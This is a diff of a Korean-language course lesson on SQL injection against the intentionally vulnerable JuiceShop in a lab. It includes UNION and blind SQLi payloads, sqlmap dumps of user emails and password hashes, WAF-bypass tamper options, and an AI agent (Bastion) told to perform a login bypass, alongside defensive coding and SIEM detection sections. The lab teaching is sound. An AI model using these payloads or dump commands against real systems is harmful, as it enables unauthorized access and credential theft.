-> **참고**: JuiceShop의 검색 쿼리는 `SELECT * FROM Products WHERE ((name LIKE '%검색어%') OR (description LIKE '%검색어%'))` 형태이므로, 괄호를 닫아주어야 한다.
-
-### 6.2 사용자 정보 추출
+SQLite는 `sqlite_master`라는 시스템 테이블에 전체 스키마 정보를 담고 있다.
 
 ```bash
-# 사용자 이메일과 비밀번호 해시 추출 시도
-curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
+# 컬럼 수 9개로 UNION (JuiceShop 검색 쿼리 기준)
+curl -s "http://10.20.30.80:3000/rest/products/search?q=xyz'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" \
   | python3 -m json.tool 2>/dev/null | head -40
 ```
 
+**페이로드 분해:**
+- `xyz'))`: 원래 쿼리의 `((name LIKE '%xyz%') OR ...)` 괄호 두 개 닫기
+- `UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master`: `sqlite_master.sql` 컬럼에 `CREATE TABLE` 문이 전부 들어있음
+- `--`: 나머지 주석
+
+**예상 출력 (일부):**
+```json
+{"data":[
+  {"id":"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR, `email` VARCHAR, `password` VARCHAR, `role` VARCHAR, ...)", "name":"2", ...},
+  {"id":"CREATE TABLE `Products` (...)", ...}
+]}
+```
+
+**결과 해석:** `Users` 테이블의 컬럼 이름을 모두 확인 — `id, username, email, password, role`.
+
+## 6.2 사용자 정보 추출
+
+```bash
+# 이메일 + 비밀번호 해시 추출
+curl -s "http://10.20.30.80:3000/rest/products/search?q=xyz'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
+  | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('추출된 사용자:')
+for row in d.get('data', []):
+    email = row.get('id','')
+    pw = row.get('name','')
+    # UNION 결과는 원래 Products 스키마에 맞춰 들어가므로 id/name 필드에 이메일/비밀번호가 매핑됨
+    if '@' in str(email):
+        print(f'  {email:30s} {pw}')
+"
+```
+
+**실행 결과 예시:**
+```
+추출된 사용자:
+  admin@juice-sh.op              0192023a7bbd73250516f069df18b500
+  jim@juice-sh.op                e541ca7ecf72b8d1286474e613..........
+  bender@juice-sh.op             0c36e5.............................
+  ...
+```
+
+**결과 해석:** 모든 사용자의 이메일과 MD5 패스워드 해시 확보. crackstation.net 또는 hashcat으로 일부는 즉시 역산 가능. Week 06 패스워드 공격에서 이어서 다룬다.
+
+## 6.3 Boolean Blind SQLi로 admin 비밀번호 한 글자씩 추출
+
+```bash
+# admin의 password 필드 첫 글자가 '0'인지 확인
+SIZE_0=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(SELECT+SUBSTR(password,1,1)+FROM+Users+WHERE+email='admin@juice-sh.op')='0'--" | wc -c)
+echo "첫글자 '0'인지 확인: $SIZE_0 bytes"
+
+# 첫 글자가 'a'인지 확인
+SIZE_A=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(SELECT+SUBSTR(password,1,1)+FROM+Users+WHERE+email='admin@juice-sh.op')='a'--" | wc -c)
+echo "첫글자 'a'인지 확인: $SIZE_A bytes"
+```
+
+**결과 해석:** 응답 크기가 큰 쪽이 "참"인 조건. admin 해시는 `0192...`로 시작하므로 `'0'` 쿼리가 큰 응답, `'a'` 쿼리가 빈 응답이어야 한다. 수동으로 한 글자씩 맞추는 건 비효율적이므로 sqlmap(Part 7) 사용.
+
 ---
 
-## 7. SQL Injection 방어
+# Part 7: sqlmap 자동화
 
-> **방어를 왜 배우는가?**
-> 공격만 알면 "스크립트 키디"에 불과하다. 보안 전문가는 공격을 이해하고 **방어 방안을 제시**해야 한다.
-> 모의해킹 보고서의 "대응 방안" 섹션에는 반드시 구체적인 코드 수준의 수정 방법이 포함되어야 한다.
-> "입력값을 검증하세요"라는 추상적 권고가 아니라, **매개변수화된 쿼리 코드 예시**를 첨부하는 것이 전문가이다.
+## 7.1 sqlmap이란
 
-### 7.1 매개변수화된 쿼리 (Parameterized Queries) — 가장 효과적인 방어
+**정의:** SQL Injection 탐지·악용 자동화 전용 도구. 모든 SQLi 유형(Error/UNION/Boolean/Time-based/Stacked)을 자동 시도하고, DB·테이블·데이터 덤프까지 한 번에 수행한다.
+
+**왜 sqlmap인가:** Part 4~6의 수작업을 수백·수천 번 반복해야 하는 데이터 추출을 자동화. 모의해킹 실무의 표준 도구.
+
+## 7.2 설치 확인
+
+```bash
+which sqlmap || sudo apt-get install -y sqlmap 2>&1 | tail -3
+sqlmap --version 2>/dev/null | head -1
+```
+
+**예상 출력:**
+```
+/usr/bin/sqlmap
+1.7.2#stable
+```
+
+## 7.3 기본 탐지
+
+```bash
+# 검색 기능 URL에 대해 SQLi 자동 탐지
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --random-agent 2>&1 | tail -30
+```
+
+**옵션 분해:**
+- `-u URL`: 검사할 URL
+- `--batch`: 모든 프롬프트를 기본값 자동 응답 (비인터랙티브)
+- `--random-agent`: User-Agent 무작위 (IPS 회피)
+
+**예상 출력:**
+```
+[INFO] testing connection to the target URL
+[INFO] checking if the target is protected by some kind of WAF/IPS
+[INFO] testing for SQL injection on GET parameter 'q'
+[INFO] GET parameter 'q' is vulnerable. Do you want to keep testing the others? [y/N]
+sqlmap identified the following injection point(s):
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Payload: q=apple' AND 3567=3567 AND 'oXNz'='oXNz
+    Type: error-based
+    Payload: q=apple' AND (SELECT ... FROM sqlite_master)...
+---
+the back-end DBMS is SQLite
+```
+
+**결과 해석:** sqlmap이 이 URL의 `q` 파라미터가 **Boolean-based + Error-based** 두 가지 SQLi에 취약하며 DB가 SQLite임을 자동 판별.
+
+## 7.4 테이블 목록 덤프
+
+```bash
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --tables 2>&1 | tail -30
+```
+
+**옵션 분해:**
+- `--tables`: 현재 DB의 모든 테이블 목록
+
+**예상 출력:**
+```
+Database: SQLite_masterdb
+[15 tables]
++--------------------+
+| Addresses          |
+| BasketItems        |
+| Baskets            |
+| Cards              |
+| Challenges         |
+| Complaints         |
+| Deliveries         |
+| Feedbacks          |
+| Memories           |
+| PrivacyRequests    |
+| Products           |
+| Quantities         |
+| Recycles           |
+| SecurityAnswers    |
+| SecurityQuestions  |
+| Users              |
++--------------------+
+```
+
+## 7.5 Users 테이블 덤프
+
+```bash
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+  --batch -T Users --columns 2>&1 | tail -30
+
+# 실제 데이터 덤프
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+  --batch -T Users -C email,password --dump 2>&1 | tail -40
+```
+
+**옵션 분해:**
+- `-T 테이블`: 특정 테이블만
+- `-C 컬럼1,컬럼2`: 특정 컬럼만
+- `--dump`: 실제 데이터 출력
+
+**예상 출력:**
+```
+Table: Users
+[21 entries]
++------------------------+----------------------------------+
+| email                  | password                         |
++------------------------+----------------------------------+
+| admin@juice-sh.op      | 0192023a7bbd73250516f069df18b500 |
+| jim@juice-sh.op        | e541ca7ecf72b8d1286474e613c...   |
+...
+```
+
+**결과 해석:** 수작업으로 수백 번 요청해야 할 21건 데이터 추출을 sqlmap이 분단위로 완료. 이 해시는 Week 06 패스워드 공격에서 hashcat으로 크래킹.
+
+## 7.6 WAF 우회 옵션
+
+실제 환경에는 ModSecurity 같은 WAF가 있다. sqlmap은 `--tamper` 옵션으로 페이로드를 변형해 우회를 시도한다.
+
+```bash
+# 주요 tamper 스크립트 목록
+sqlmap --list-tampers 2>&1 | head -20
+
+# WAF 우회 시도 (주석을 공백으로 변환)
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+  --batch --tamper=space2comment,between 2>&1 | tail -10
+```
+
+**주요 tamper:**
+- `space2comment`: 공백을 `/**/`로 치환
+- `between`: `>`, `<`를 `BETWEEN ... AND ...`으로 변환
+- `charencode`: 페이로드 URL 인코딩
+- `randomcase`: SQL 키워드 대소문자 혼용 (SelECt)
+
+---
+
+# Part 8: SQL Injection 방어
+
+**방어를 왜 배우는가?** 모의해킹 보고서의 "대응 방안" 섹션은 단순 권고가 아니라 **구체적 코드 예시**를 포함해야 전문가로 평가된다.
+
+## 8.1 매개변수화된 쿼리 (Parameterized Queries) — 가장 효과적
 
 **취약한 코드 (절대 하지 말 것):**
 ```javascript
-// 사용자 입력이 SQL에 직접 삽입됨 - 위험!
+// 문자열 연결로 SQL 생성 → SQLi 취약
 const query = "SELECT * FROM Users WHERE email = '" + userInput + "'";
 db.query(query);
 ```
 
 **안전한 코드:**
 ```javascript
-// 매개변수화된 쿼리 - 입력이 데이터로만 처리됨
+// 플레이스홀더(?)로 입력을 데이터로만 처리
 const query = "SELECT * FROM Users WHERE email = ?";
 db.query(query, [userInput]);
 ```
 
-매개변수화된 쿼리에서는 `' OR 1=1--`을 입력해도 문자열 데이터로만 취급된다:
+매개변수화에서는 `' OR 1=1--`을 입력해도 문자열 데이터로만 취급된다:
 ```sql
--- 실제 실행되는 쿼리
+-- 실제 실행
 SELECT * FROM Users WHERE email = ''' OR 1=1--'
--- → email이 "' OR 1=1--"인 사용자를 찾음 (당연히 없음)
+-- → 문자열 "' OR 1=1--"과 일치하는 email을 찾음 → 당연히 없음 → 로그인 실패
 ```
 
-### 7.2 ORM 사용
+**왜 작동하는가:** DB 드라이버가 SQL 구문과 데이터를 분리하여 컴파일하므로, 데이터 안의 어떤 문자도 SQL 구문으로 해석되지 않는다.
 
-ORM(Object-Relational Mapping)은 SQL을 직접 작성하지 않고 프로그래밍 언어의 객체로 DB를 조작한다.
+## 8.2 ORM 사용
+
+ORM(Object-Relational Mapping)은 SQL을 직접 작성하지 않고 프로그래밍 언어의 객체로 DB를 조작한다. 내부적으로 매개변수화를 사용한다.
 
 ```javascript
-// Sequelize ORM 사용 (자동으로 매개변수화)
+// Sequelize ORM (JuiceShop이 사용하는 ORM)
 const user = await User.findOne({
   where: { email: userInput }
 });
 ```
 
-### 7.3 입력 검증 (Input Validation)
+**주의:** ORM도 raw SQL을 허용하는 기능(`sequelize.query`)이 있고, 그럴 때는 여전히 SQLi 가능. JuiceShop의 search 기능이 바로 그런 경우다.
+
+## 8.3 입력 검증 (Input Validation) — 보조적
 
 ```javascript
 // 이메일 형식 검증
@@ -504,214 +652,227 @@ if (!/^[a-zA-Z0-9@._-]+$/.test(userInput)) {
 }
 ```
 
-### 7.4 최소 권한 원칙
+**주의:** 입력 검증만으로는 불완전하다. 매개변수화와 **함께** 사용해야 한다.
 
-데이터베이스 사용자에게 필요한 최소한의 권한만 부여한다:
-- 웹 앱용 DB 계정: SELECT, INSERT만 허용
-- 관리자용 DB 계정: 모든 권한
-- DROP, ALTER 같은 위험한 권한은 웹 앱에 부여하지 않음
+## 8.4 최소 권한 원칙
 
-### 7.5 에러 메시지 제한
+웹 앱용 DB 계정에는 필요한 최소 권한만 부여:
+- 웹 앱: `SELECT`, `INSERT`만
+- 관리 작업: 별도 계정
+- `DROP`, `ALTER` 같은 권한은 웹 앱에 절대 부여하지 않음
 
-상세한 SQL 에러를 사용자에게 보여주지 않는다:
-- **나쁜 예**: "SQLITE_ERROR: unrecognized token at 'OR 1=1'"
-- **좋은 예**: "로그인에 실패했습니다."
+## 8.5 에러 메시지 제한
 
----
-
-## 8. JuiceShop에서 탐지: Wazuh 연동
-
-SQL Injection 공격이 발생하면 SIEM에서 탐지할 수 있다.
-
-```bash
-# siem 서버에서 Wazuh 알림 확인
-ssh ccc@10.20.30.100 \
-  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5 | python3 -m json.tool" 2>/dev/null
-```
-
-> **참고**: JuiceShop의 접근 로그에 SQLi 패턴이 기록되면, Wazuh 규칙이 이를 탐지하여 알림을 생성한다.
-
----
-
-## 9. Bastion로 SQLi 테스트 자동화
-
-Bastion Manager API를 호출하여 작업을 수행합니다.
-
-```bash
-# SQLi 테스트 프로젝트 생성
-PROJECT_ID=$(curl -s -X POST http://localhost:9100/projects \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ccc-api-key-2026" \
-  -d '{"name":"week04-sqli-test","request_text":"JuiceShop SQLi 취약점 점검","master_mode":"external"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
-
-echo "Project ID: $PROJECT_ID"
-
-# Stage 전환
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/plan \
-  -H "X-API-Key: ccc-api-key-2026" > /dev/null     # API 인증 키
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/execute \
-  -H "X-API-Key: ccc-api-key-2026" > /dev/null     # API 인증 키
-
-# SQLi 테스트 실행
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/execute-plan \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ccc-api-key-2026" \
-  -d '{                                                # 요청 데이터(body)
-    "tasks": [
-      {
-        "order": 1,
-        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'\\'' OR 1=1--\\\",\\\"password\\\":\\\"test\\\"}\"",
-        "risk_level": "medium"
-      }
-    ],
-    "subagent_url": "http://localhost:8002"
-  }'
-
-# 결과 확인
-curl -s -H "X-API-Key: ccc-api-key-2026" \
-  http://localhost:9100/projects/$PROJECT_ID/evidence/summary \
-  | python3 -m json.tool
+```javascript
+try {
+  await query(...);
+} catch (err) {
+  logger.error(err);         // 서버 로그에만 상세 기록
+  res.status(500).send("Internal Server Error");  // 사용자에겐 일반 메시지
+}
 ```
 
 ---
 
-## 10. 실습 체크리스트
+# Part 9: SIEM 탐지 (Wazuh)
 
-다음 항목을 모두 수행하라:
+SQL Injection 공격이 발생하면 Wazuh가 웹 서버 로그에서 패턴을 탐지한다.
 
-- [ ] JuiceShop 로그인 페이지에서 `' OR 1=1--`로 admin 로그인 성공
-- [ ] 획득한 JWT 토큰을 디코딩하여 admin 정보 확인
-- [ ] admin 토큰으로 `/api/Users/` API를 호출하여 전체 사용자 목록 조회
-- [ ] 검색 기능에서 `' OR 1=1--`로 모든 제품 표시
-- [ ] UNION SELECT를 사용하여 데이터 추출 시도
-- [ ] 오류 메시지에서 데이터베이스 종류(SQLite) 확인
+## 9.1 Wazuh 알림 확인
+
+```bash
+# siem 서버에서 최근 알림 조회
+ssh ccc@10.20.30.100 "sudo tail -30 /var/ossec/logs/alerts/alerts.json" 2>/dev/null \
+  | python3 -c "
+import sys, json
+for line in sys.stdin:
+    try:
+        a = json.loads(line)
+        rule = a.get('rule',{})
+        if rule.get('level',0) >= 5:
+            print(f'[{rule[\"level\"]}] {rule[\"description\"][:80]}')
+    except: pass
+" 2>/dev/null
+```
+
+**예상 알림 (있다면):**
+- `SQL injection attempt` (웹 로그에서 `UNION`, `OR 1=1` 패턴)
+- `Suspicious URL access` (관리자 경로 반복 접근)
+
+**주의:** JuiceShop은 Apache 접근 로그를 Wazuh에 전달하도록 설정되어 있지 않을 수 있다. Week 08+ SOC 과정에서 이 파이프라인을 구성한다.
+
+## 9.2 Suricata IPS의 탐지
+
+```bash
+# secu 서버에서 Suricata alert 확인
+ssh ccc@10.20.30.1 "sudo tail -10 /var/log/suricata/fast.log" 2>/dev/null | head -5
+```
+
+**예상 출력 (있다면):**
+```
+03/28/2026-14:22:11.123456 [**] [1:2012887:3] ET WEB_SPECIFIC_APPS SQL Injection Attempt -- UNION SELECT [**]
+```
+
+**결과 해석:** Suricata의 Emerging Threats 룰셋이 SQLi 패턴을 탐지. Week 09~10에서 이 룰을 우회하는 기법을 다룬다.
+
+---
+
+# Part 10: Bastion 자연어 SQLi 테스트
+
+수작업 SQLi 실습을 Bastion에게 자연어로 지시한다.
+
+```bash
+curl -s -X POST http://10.20.30.200:8003/ask \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "message": "JuiceShop(http://10.20.30.80:3000)의 /rest/user/login 엔드포인트에 이메일 필드 SQL Injection을 시도해서 admin으로 로그인이 되는지 확인하고, 성공하면 JWT 토큰을 디코딩해서 role 필드를 보여줘."
+  }' \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
+```
+
+**예상 응답 (자연어 요약):**
+```
+SQL Injection 테스트 결과:
+
+페이로드: ' OR 1=1--
+HTTP 상태: 200 OK
+응답: authentication.token 발급됨
+JWT 디코딩 결과:
+  email: admin@juice-sh.op
+  role: admin
+  id: 1
+
+결론: 로그인 우회 성공. admin 권한 획득. CVSS 9.8 CRITICAL.
+```
+
+Evidence 확인:
+
+```bash
+curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
+import sys, json
+for e in json.load(sys.stdin)[:5]:
+    msg = e.get('user_message','')[:70]
+    ok = '✓' if e.get('success') else '✗'
+    print(f'  {ok} {msg}')
+"
+```
 
 ---
 
-## 과제
+## 과제 (다음 주까지)
 
-1. JuiceShop의 로그인 API에 SQL Injection을 수행하여 admin으로 로그인하고, 획득한 JWT 토큰의 전체 내용을 디코딩하여 제출하라
-2. 검색 API(`/rest/products/search`)에 UNION SELECT를 시도하여, Users 테이블의 이메일 목록을 추출하라 (힌트: 컬럼 수 9개)
-3. "매개변수화된 쿼리"를 사용하면 SQL Injection이 왜 불가능해지는지 자신의 말로 설명하라
-4. SQL Injection 공격이 SIEM(Wazuh)에서 어떻게 탐지될 수 있는지 논의하라
+### 과제 1: JuiceShop SQLi 완전 공략 보고서 (60점)
+
+1. **관리자 로그인 우회** (15점)
+   - `' OR 1=1--`로 admin 로그인
+   - JWT 토큰 전체를 3부분으로 분리하여 페이로드 디코딩
+   - 관리자 토큰으로 `/administration` 접근 성공 캡처
+
+2. **UNION 기반 데이터 추출** (20점)
+   - `rest/products/search` 엔드포인트에 UNION SELECT 페이로드 작성
+   - `sqlite_master`에서 테이블 목록 추출
+   - `Users` 테이블의 email + password 전체 추출 (최소 5건)
+
+3. **Blind SQLi 시간 측정** (10점)
+   - `AND 1=1` vs `AND 1=2`의 응답 크기 비교
+   - Time-based (randomblob) 응답 시간 비교
+
+4. **방어 코드 제안** (15점)
+   - JuiceShop의 search 기능을 매개변수화된 쿼리로 수정하는 의사 코드 작성
+   - ORM 사용으로 바꾸는 방법 추가 설명
+
+### 과제 2: sqlmap 자동화 (40점)
+
+**각 10점:**
+1. `sqlmap --dbs`로 DB 목록 덤프
+2. `sqlmap -T Users -C email,password --dump`로 Users 테이블 전체 덤프
+3. `sqlmap --tamper=space2comment`로 WAF 우회 옵션 적용 결과
+4. Bastion `/ask`로 SQLi 테스트를 자연어로 지시한 결과 + `/evidence` 기록 캡처
+
+---
+
+## 다음 주 예고
+
+**Week 05: Cross-Site Scripting (XSS)**
+- XSS의 3가지 유형 (Stored/Reflected/DOM)
+- JavaScript 기초 (이벤트, 쿠키, localStorage 접근)
+- JuiceShop XSS 챌린지 실습
+- 쿠키/JWT 탈취 공격
+- CSP(Content-Security-Policy) 방어
 
 ---
 
-## 핵심 요약
+## 용어 해설 (이번 주 추가분)
 
-- **SQL Injection**은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점이다
-- `' OR 1=1--`는 가장 기본적인 SQLi 페이로드로, 인증 우회에 사용된다
-- SQLi 유형: Error-based, UNION-based, Blind (Boolean/Time-based)
-- **방어**: 매개변수화된 쿼리, ORM, 입력 검증, 최소 권한, 에러 메시지 제한
-- JuiceShop에서 실제 SQLi 공격을 통해 admin 권한을 획득할 수 있다
-
-> **다음 주 예고**: Week 05에서는 OWASP Top 10의 또 다른 Injection 공격인 XSS(Cross-Site Scripting)를 배운다. JavaScript를 이용한 쿠키 탈취와 세션 하이재킹을 실습한다.
-
----
-
----
-
-## 자가 점검 퀴즈 (10문항)
-
-이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.
-
-**Q1.** SQL Injection이 발생하는 근본 원인은?
-- (a) 서버 성능 부족  (b) **사용자 입력이 SQL 쿼리에 그대로 삽입**  (c) 네트워크 지연  (d) 디스크 부족
-
-**Q2.** `' OR 1=1--`에서 `--`의 역할은?
-- (a) 문자열 연결  (b) 변수 선언  (c) **SQL 주석 (이후 무시)**  (d) 조건 추가
-
-**Q3.** UNION SELECT 공격이 성공하려면 반드시 맞춰야 하는 것은?
-- (a) 테이블 이름  (b) **원래 쿼리의 컬럼 수**  (c) DB 버전  (d) 사용자 권한
-
-**Q4.** Blind SQLi에서 참/거짓을 구분하는 방법은?
-- (a) 에러 메시지 확인  (b) **응답 내용이나 시간의 차이 관찰**  (c) 소스 코드 확인  (d) 서버 재시작
-
-**Q5.** SQL Injection 방어의 가장 효과적인 방법은?
-- (a) WAF 배치  (b) IP 차단  (c) **매개변수화된 쿼리(Prepared Statement)**  (d) HTTPS 적용
-
-**Q6.** JuiceShop에서 SQLi로 획득한 JWT의 역할은?
-- (a) 암호화 키  (b) **인증 토큰 (세션 대용)**  (c) DB 접속 정보  (d) API 문서
-
-**Q7.** 에러 메시지에 "SQLITE_ERROR"가 나타나면 알 수 있는 것은?
-- (a) 서버 OS  (b) **데이터베이스 종류 (SQLite)**  (c) 네트워크 구성  (d) 방화벽 설정
-
-**Q8.** ORM(Object-Relational Mapping)이 SQLi를 방지하는 이유는?
-- (a) SQL을 사용하지 않아서  (b) **자동으로 매개변수화하여 입력이 데이터로만 처리**  (c) 암호화해서  (d) 로그를 남겨서
-
-**Q9.** OWASP Top 10에서 Injection은 몇 번인가?
-- (a) A01  (b) A02  (c) **A03**  (d) A10
-
-**Q10.** 입력값 `admin@juice-sh.op'--`로 로그인이 되는 이유는?
-- (a) 비밀번호가 맞아서  (b) **`--`가 비밀번호 검증 부분을 주석 처리**  (c) 관리자 예외  (d) 세션이 남아서
-
-**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:b, Q9:c, Q10:b
-
----
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **SQL** | Structured Query Language | DB 조작 언어 | 도서관 대출 신청서 양식 |
+| **SQLi** | SQL Injection | 사용자 입력이 SQL에 섞이는 취약점 | 신청서에 "다 가져다줘" 낙서 |
+| **UNION SELECT** | - | 두 SELECT 결과를 합치는 SQL 연산자 | 두 책장을 한 번에 검색 |
+| **ORM** | Object-Relational Mapping | 객체로 DB를 다루는 라이브러리 | 주문 받아주는 웨이터 |
+| **매개변수화 쿼리** | Parameterized Query | SQL과 데이터를 분리 처리 | 양식과 내용물 분리 봉인 |
+| **Sequelize** | Sequelize | Node.js의 대표 ORM (JuiceShop이 사용) | JS용 ORM |
+| **SQLite** | SQLite | 파일 기반 소형 DB (JuiceShop이 사용) | 가벼운 노트장 DB |
+| **sqlmap** | sqlmap | SQLi 자동화 도구 | SQLi 드릴 |
+| **Error-based** | - | SQL 에러로 정보 추출하는 기법 | 말실수 유도 |
+| **UNION-based** | - | UNION으로 다른 테이블 추출 | 틈새로 다른 서랍 열기 |
+| **Blind SQLi** | - | 결과가 안 보일 때 참/거짓으로 추출 | 예/아니오 스무고개 |
+| **Time-based** | - | 응답 시간으로 참/거짓 판별 | "3초 기다려"로 신호 |
 
 ---
 
 ## 📂 실습 참조 파일 가이드
 
-> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+> 이번 주 실습에서 실제로 사용한 도구·서비스의 요점.
 
 ### sqlmap
-> **역할:** SQL Injection 탐지·악용 자동화  
-> **실행 위치:** `공격자 측 CLI`  
-> **접속/호출:** `sqlmap -u <url>` 또는 `-r request.txt`
+
+> **역할:** SQL Injection 탐지·악용 자동화
+> **설치:** `sudo apt-get install sqlmap`
+> **실행 위치:** manager 또는 학생 PC
 
 **주요 경로·파일**
 
 | 경로 | 역할 |
 |------|------|
-| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 |
-| `session.sqlite` | 재실행 시 단계 스킵용 캐시 |
+| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 (재실행 시 캐시됨) |
+| `~/.local/share/sqlmap/output/<host>/log` | 요청·응답 로그 |
+| `~/.local/share/sqlmap/output/<host>/session.sqlite` | 탐지 단계 스킵용 캐시 |
 
-**핵심 설정·키**
+**핵심 옵션**
 
-- `--risk=1~3 --level=1~5` — 탐지 공격 폭 조절
-- `--technique=BEUSTQ` — B)lind E)rror U)nion S)tacked T)ime Q)uery
+| 옵션 | 의미 | 이번 주 사용 예 |
+|------|------|-----------------|
+| `-u URL` | 검사 URL | `-u "...?q=apple"` |
+| `--batch` | 자동 응답 | 인터랙티브 제거 |
+| `--random-agent` | User-Agent 무작위 | IPS 회피 |
+| `--risk=1..3 --level=1..5` | 공격 폭 조절 | 철저한 검사 시 --level=3 |
+| `--technique=BEUSTQ` | B)lind E)rror U)nion S)tacked T)ime Q)uery | 특정 기법만 |
+| `--dbs` | DB 목록 | DB 탐색 |
+| `--tables / -T 이름` | 테이블 목록 / 특정 테이블 | 스키마 확인 |
+| `-C 컬럼명` | 특정 컬럼만 덤프 | email,password |
+| `--dump` | 데이터 추출 | 최종 단계 |
+| `--tamper=스크립트` | 페이로드 변형 | WAF 우회 |
+| `--list-tampers` | 변형 스크립트 목록 | 참고용 |
 
-**로그·확인 명령**
+**주요 tamper**
 
-- `output/<host>/log` — 요청·응답 로그
+- `space2comment` — 공백 → `/**/`
+- `between` — `>`/`<` → `BETWEEN ... AND ...`
+- `charencode` — 전체 URL 인코딩
+- `randomcase` — SQL 키워드 대소문자 혼용
 
-**UI / CLI 요점**
+### JuiceShop 취약 엔드포인트 (이번 주 대상)
 
-- `sqlmap -u ... --dbs` — DB 목록
-- `sqlmap -u ... -D juice -T users --dump` — 특정 테이블 덤프
-- `sqlmap -r req.txt --batch --crawl=2` — Burp 저장 요청 기반 크롤링
+| 엔드포인트 | 메서드 | 취약점 | 공략 |
+|-----------|--------|--------|------|
+| `/rest/user/login` | POST | 이메일 필드 SQLi | `' OR 1=1--` |
+| `/rest/products/search?q=` | GET | 검색 파라미터 SQLi | UNION SELECT |
+| `/api/Users/` | GET (Bearer) | admin 토큰으로 접근 | Week 06 연계 |
 
-> **해석 팁.** `--batch`로 대화형 프롬프트 자동 Y 처리. WAF가 있을 땐 `--tamper=space2comment,between` 조합으로 우회 시도.
+### Bastion API — 이번 주 사용 엔드포인트
 
-### Burp Suite Community
-> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
-> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
-
-**주요 경로·파일**
-
-| 경로 | 역할 |
-|------|------|
-| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
-| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
-| `Repeater` | 단건 요청 수동 반복 |
-
-**핵심 설정·키**
-
-- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
-- `Target → Scope` — in-scope 호스트만 처리
-
-**로그·확인 명령**
-
-- `Logger` — 세션 전체 요청 타임라인
-
-**UI / CLI 요점**
-
-- Ctrl+R — 요청을 Repeater로 전송
-- Ctrl+I — Intruder로 전송 후 위치(§) 설정
-- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합
-
-> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.
-
+| 메서드 | 경로 | 용도 |
+|--------|------|------|
+| POST | `/ask` | 자연어 SQLi 지시·결과 요약 |
+| GET | `/evidence?limit=N` | 작업 기록 |
